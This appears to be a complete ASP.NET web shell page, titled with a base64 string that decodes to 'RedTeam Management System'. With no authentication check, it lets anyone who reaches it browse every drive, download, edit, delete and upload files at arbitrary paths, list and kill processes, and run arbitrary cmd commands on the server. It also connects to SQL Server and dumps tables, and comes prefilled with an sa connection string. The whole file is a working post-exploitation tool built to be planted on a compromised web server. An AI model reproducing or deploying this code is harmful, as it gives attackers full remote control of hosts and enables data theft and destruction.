<%@ Page Language="C#"  validateRequest="false" %><%@ Import Namespace= "System.Diagnostics"%><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><%@ Import Namespace="System.IO" %><script runat="server"> protected void Page_Load(object sender, EventArgs e) {  string s = Request.QueryString["act"];  string p = Request.QueryString["p"];  string d = @Request.QueryString["dir"];  if (d == null) d = Server.MapPath("~/");      switch (s)   {    case "edit":     {      if (ishave(d))      {       edit(d);       TextBox_MAIN.Visible = true;       list(d);      }      break;     }    case "download":     {      if (ishave(d))      {       down(d);       list(d);      }      break;     }    case "del":     {      if (ishave(d))      {       del(d);       list(d);      }      break;     }    default:     {      list(@d);      break;      }   } }      private bool ishave(string path) {  FileInfo newfile = new FileInfo(path);  return newfile.Exists;    } private void edit(string path) {  if (!IsPostBack)  {   StreamReader filestr = new StreamReader(path, Encoding.Default);   TextBox_MAIN.Text = filestr.ReadToEnd();   filestr.Close();  } } private void del(string path) {  FileInfo file = new FileInfo(path);  file.Delete(); } private void down(string path) {  FileInfo file = new System.IO.FileInfo(path);   Response.Clear();   Response.AddHeader("Content-Disposition", "attachment; filename=" + file.Name);   Response.AddHeader("Content-Length", file.Length.ToString());   Response.ContentType = "application/octet-stream";   Response.Filter.Close();   Response.WriteFile(file.FullName);   Response.End();  } private void list(string path) {     string[] driverlist = Directory.GetLogicalDrives();   TreeView_file.Nodes.Clear();   bool Isthis = true;   for (int i = 0; i <driverlist.Length; i++)    {     TreeNode item = new TreeNode();     item.Text = driverlist[i];     item.NavigateUrl = "?dir=" + driverlist[i];     TreeView_file.Nodes.Add(item);     if (path != null && Isthis)      {       TreeNode item0 = new TreeNode();       item0.Text = "[..] Parent Directory";       if (path.Length > path.LastIndexOf("\\")) path = path.Substring(0, path.LastIndexOf("\\")+1);       DirectoryInfo folder = new DirectoryInfo(@path);       FileSystemInfo[] fileinfo = folder.GetFileSystemInfos();                   if (folder.Parent==null)      {       item0.NavigateUrl = @"?dir=" + path;      }       else      {       item0.NavigateUrl = @"?dir=" + folder.Parent.FullName;      }       item.ChildNodes.Add(item0);       Table1.Rows.Clear();       for (int m = 0, j = 0; j < fileinfo.Length; j++)       {        FileInfo file = fileinfo[j] as FileInfo;        if (file != null)        {         TableRow row = new TableRow();         Table1.Rows.Add(row);         TableCell cell = new TableCell();         HyperLink namelink = new HyperLink();         namelink.Text = file.Name;         namelink.NavigateUrl = "?act=download&dir=" + file.FullName;         cell.Controls.Add(namelink);         Table1.Rows[m].Cells.Add(cell);         cell.Width = 240;         TableCell cell_sec = new TableCell();         cell_sec.Text = file.Attributes.ToString();         Table1.Rows[m].Cells.Add(cell_sec);             TableCell cell_size = new TableCell();         cell_size.Text = file.Length.ToString()+" size";         Table1.Rows[m].Cells.Add(cell_size);                TableCell cell1 = new TableCell();         HyperLink namelink1 = new HyperLink();         namelink1.Text = "edit";         namelink1.NavigateUrl = "?act=edit&dir=" + file.FullName;         cell1.Controls.Add(namelink1);         Table1.Rows[m].Cells.Add(cell1);         TableCell cell2 = new TableCell();         HyperLink namelink2 = new HyperLink();          namelink2.Text = "del";         namelink2.NavigateUrl = "?act=del&dir=" + file.FullName;         cell2.Controls.Add(namelink2);         Table1.Rows[m].Cells.Add(cell2);         m++;        }     else     {      currentpath.Text = path;      TreeNode pnode = new TreeNode();      pnode.Text = fileinfo[j].Name;      pnode.NavigateUrl = "?dir=" + fileinfo[j].FullName + "\\";      TreeView_file.Nodes[i].ChildNodes.Add(pnode);     }     Isthis = false;    }   }  } } protected void Button_up_Click(object sender, EventArgs e) {  FileUpload1.SaveAs(TextBox_creat.Text);  msg.Text = "File successfully uploaded to " + currentpath.Text; } protected void Button6_Click(object sender, EventArgs e) { Panel_file.Visible = true;  panel_procress.Visible = false;  list(MapPath("~/")); } protected void sysinfo_Click(object sender, EventArgs e) {  panel_procress.Visible = false;  Panel_file.Visible = true;  list(MapPath("~/")); } private void serverinfo() {  TextBox_MAIN.Text = Server.MachineName.ToString(); } protected void init_Click(object sender, EventArgs e) {  TextBox_MAIN.Text= "";  msg.Text = "initialization"; } protected void filesave_Click(object sender, EventArgs e) {  StreamWriter filewrite =new StreamWriter(Request.QueryString["dir"],false,Encoding.Default);  filewrite.Write(TextBox_MAIN.Text);  filewrite.Close();  msg.Text = "Successfully saved"; } private void KillProcess(string processName) {  System.Diagnostics.Process myproc = new System.Diagnostics.Process();  try  {   foreach (Process thisproc in Process.GetProcessesByName(processName))   {    if (!thisproc.CloseMainWindow())    {     thisproc.Kill();    }   }  }  catch (Exception Exc)  {msg.Text="soory!can't end the procress";} } protected void LinkButton_prc_Click(object sender, EventArgs e) {  Panel_file.Visible = false;  panel_procress.Visible = true;  lisproc();  Button_kill.Attributes.Add("onclick", "javascript: return confirm('Are you really going to end this process?');");  }		private void lisproc(){ ListBox1.Items.Clear(); ArrayList procList = new ArrayList(); string tempName = ""; int begpos; int endpos; foreach (Process thisProc in System.Diagnostics.Process.GetProcesses()) {  tempName = thisProc.ToString();  begpos = tempName.IndexOf("(") + 1;  endpos = tempName.IndexOf(")");  tempName = tempName.Substring(begpos, endpos - begpos);  ListBox1.Items.Add(tempName);}    } protected void Button_kill_Click(object sender, EventArgs e) {  KillProcess(ListBox1.SelectedItem.Text);  msg.Text = "ok!";  lisproc();   } protected void Button4_Click(object sender, EventArgs e) {  lisproc(); } protected void LINK_IIS_Click(object sender, EventArgs e) {      panel_procress.Visible = false;  TextBox_MAIN.Visible = false; } protected void LinkButton3_Click(object sender, EventArgs e) {  Session["login"] = "";  Response.Redirect("#"); } protected void cmdbtn_Click(object sender, EventArgs e) {		  Panel_file.Visible = false;  panel_procress.Visible = false;  TextBox_MAIN.BackColor = System.Drawing.Color.Black;  TextBox_MAIN.ForeColor = System.Drawing.Color.White;  TextBox_MAIN.Text=ExcuteCmd(TextBox_cmd.Text,TextBox_cmdpath.Text);  msg.Text = "Command completed"; } private string ExcuteCmd(string arg, string cmdpath) {  if (cmdpath == "") cmdpath = "";  ProcessStartInfo psi = new ProcessStartInfo();  psi.FileName = cmdpath;  psi.Arguments = "/c " + arg;  psi.RedirectStandardOutput = true;  psi.UseShellExecute = false;  Process p = Process.Start(psi);  StreamReader stmrdr = p.StandardOutput;  string s = stmrdr.ReadToEnd();		string s1 = s.Replace("<", "[");		string s2 = s1.Replace(">", "]");  stmrdr.Close();  return s2; } protected void LinkButton_sql_Click(object sender, EventArgs e) {    panel_procress.Visible = false;  Panel_file.Visible = false;  TextBox_MAIN.Visible = false;  sqlpnl.Visible = true; } private void loaddata() {  System.Data.SqlClient.SqlConnection myconn = new System.Data.SqlClient.SqlConnection(TextBox_constr.Text);  System.Data.SqlClient.SqlCommand sqlcmd = new System.Data.SqlClient.SqlCommand();  sqlcmd.CommandText = "SELECT * FROM " + D.SelectedValue;  sqlcmd.Connection = myconn;  try  {   myconn.Open();   System.Data.SqlClient.SqlDataAdapter sda = new System.Data.SqlClient.SqlDataAdapter(sqlcmd.CommandText, myconn);   System.Data.DataSet ds = new System.Data.DataSet();   sda.Fill(ds, D.SelectedValue);   GridView1.DataSource = ds.Tables[D.SelectedValue];   GridView1.DataBind();   sqlcmd.Dispose();   myconn.Close();  }  catch (Exception ex)  {   Response.Write(ex.ToString());   Response.End();  }    } protected void Button_sqlct_Click(object sender, EventArgs e) {  System.Data.SqlClient.SqlConnection myconn = new System.Data.SqlClient.SqlConnection(TextBox_constr.Text);  System.Data.SqlClient.SqlCommand sqlcmd = new System.Data.SqlClient.SqlCommand();  sqlcmd.Connection = myconn;  sqlcmd.CommandText = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES";  try  {   myconn.Open();   System.Data.SqlClient.SqlDataAdapter sda = new System.Data.SqlClient.SqlDataAdapter(sqlcmd.CommandText, myconn);   System.Data.DataSet ds = new System.Data.DataSet();   sda.Fill(ds, "INFORMATION_SCHEMA.TABLES");   D.DataSource = ds.Tables["INFORMATION_SCHEMA.TABLES"];   D.DataTextField = "table_name";   D.DataValueField = "table_name";   D.DataBind();   sqlcmd.Dispose();   myconn.Close();  }  catch (Exception ex)  {   Response.Write(ex.ToString());   Response.End();   } } protected void D_SelectedIndexChanged(object sender, EventArgs e) {  loaddata();  } protected void GridView1_PageIndexChanging(object sender, GridViewPageEventArgs e) {  GridView1.PageIndex = e.NewPageIndex;  loaddata(); } </script><html xmlns="http://www.w3.org/1999/xhtml"><head runat="server"> <title>UmVkVGVhbSBNYW5hZ2VtZW50IFN5c3RlbQ.jpg</title></head><body > <form id="form1"  runat="server">      <div id="head">      <font color="#2c3315"><b>UmVkVGVhbSBNYW5hZ2VtZW50IFN5c3RlbQ.jpg</b></font>&nbsp;       <div>basic skills         <asp:LinkButton ID="sysinfo" runat="server" OnClick="sysinfo_Click" Height="14px" Width="48px">File_M</asp:LinkButton>&nbsp;         <asp:LinkButton ID="LinkButton_prc" runat="server" OnClick="LinkButton_prc_Click" Height="14px" Width="48px">Proc_M</asp:LinkButton>&nbsp;        <asp:LinkButton ID="LinkButton_sql" runat="server" Height="14px" Width="48px" OnClick="LinkButton_sql_Click">DBMS</asp:LinkButton>          <asp:LinkButton ID="LinkButton3" runat="server" Height="14px" OnClick="LinkButton3_Click">Exit</asp:LinkButton></div>        <div>File Management         <asp:FileUpload ID="FileUpload1" runat="server" Height="20px" Width="371px" />         <asp:TextBox ID="TextBox_creat" runat="server" Height="14px"></asp:TextBox>         <asp:Button ID="Button_up" runat="server" Text="Upload" OnClick="Button_up_Click" Height="20px" />               </div>       <div>Command Execution&nbsp;<asp:TextBox ID="TextBox_cmd" runat="server" Height="14px" Width="293px"></asp:TextBox>         <asp:Button ID="cmdbtn" runat="server" Text="Execute" Height="20px" OnClick="cmdbtn_Click" />&nbsp;<asp:TextBox ID="TextBox_cmdpath" runat="server" Height="14px"></asp:TextBox>(If it is empty here, use the default path of cmd)</div>       <div>Current Path         <asp:TextBox ID="currentpath" runat="server" ForeColor="#2c3315" Height="14px" Width="497px"></asp:TextBox>         <asp:Button ID="Button6" runat="server" OnClick="Button6_Click" Text="Home" Height="20px" Width="64px" /><br />           <div class="msg_css">          <strong>Prompt information:</strong><asp:Label ID="msg" runat="server" Text="RedTeam Management System"></asp:Label></div>              </div>    </div>    <div class="files">    <asp:Panel ID="Panel_file" runat="server" Width="100%" Wrap="False">     <div  class="tree_file">     <asp:TreeView ID="TreeView_file" runat="server" AutoGenerateDataBindings="False" BorderColor="Gray" BorderWidth="1px" EnableTheming="False" ShowLines="True" ImageSet="Msdn" NodeIndent="15" >      <ParentNodeStyle Font-Bold="False" />      <HoverNodeStyle Font-Underline="True" ForeColor="#6666AA" />      <SelectedNodeStyle BackColor="#B5B5B5" Font-Underline="False" HorizontalPadding="0px"       VerticalPadding="0px" />      <NodeStyle Font-Names="Tahoma" Font-Size="8pt" ForeColor="Black" HorizontalPadding="2px"       NodeSpacing="0px" VerticalPadding="2px" />       </asp:TreeView></div>    <div class="table_file">       <asp:Table ID="Table1" runat="server" HorizontalAlign="Left" Width="100%">     </asp:Table></div>         </asp:Panel>           <div class="panel_proc">      <asp:Panel ID="panel_procress" runat="server" Width="100%" Direction="LeftToRight" HorizontalAlign="Left" Visible="False">       <asp:ListBox ID="ListBox1" runat="server" Height="270px" Width="241px"></asp:ListBox><br />        <div> <asp:Button ID="Button_kill" runat="server" Text="kill process" OnClick="Button_kill_Click" />       <asp:Button ID="Button_rfprc" runat="server" Text="refresh" OnClick="Button4_Click" /></div></asp:Panel>         </div>       <div>          <asp:TextBox ID="TextBox_MAIN" runat="server" Height="486px" TextMode="MultiLine" BackColor="#FFE0C0" Width="100%"></asp:TextBox><br />         <asp:Button ID="init" runat="server"          Text="init" OnClick="init_Click" />&nbsp;									<asp:Button ID="filesave" runat="server"          Text="save" OnClick="filesave_Click" /></div>                   <div class="panel_scan"><asp:Panel ID="scanpnl" runat="server" Width="100%" Visible="False">      </asp:Panel></div>      <div class="panel_sys">       &nbsp;</div>        <div class="panel_sys">        <asp:Panel  ID="sqlpnl" runat="server" Width="100%" Visible="false">         <asp:TextBox ID="TextBox_constr" runat="server" Width="298px">Data Source=(local);Database=campusNet;uid=sa;password=1720;</asp:TextBox>         <asp:Button ID="Button_sqlct" runat="server" Text="connect" OnClick="Button_sqlct_Click" />         <asp:DropDownList ID="D" runat="server" AutoPostBack="True" Width="275px" OnSelectedIndexChanged="D_SelectedIndexChanged" >         </asp:DropDownList>&nbsp;         <asp:GridView ID="GridView1" runat="server" BackColor="White" BorderColor="#999999" BorderStyle="None" BorderWidth="1px" CellPadding="3" GridLines="Vertical" AllowPaging="True" OnPageIndexChanging="GridView1_PageIndexChanging">          <FooterStyle BackColor="#CCCCCC" ForeColor="Black" />          <RowStyle BackColor="#EEEEEE" ForeColor="Black" />          <SelectedRowStyle BackColor="#008A8C" Font-Bold="True" ForeColor="White" />          <PagerStyle BackColor="#999999" ForeColor="Black" HorizontalAlign="Center" />          <HeaderStyle BackColor="#000084" Font-Bold="True" ForeColor="White" />          <AlternatingRowStyle BackColor="Gainsboro" />         </asp:GridView>        </asp:Panel>       &nbsp;</div>   </form></body></html>
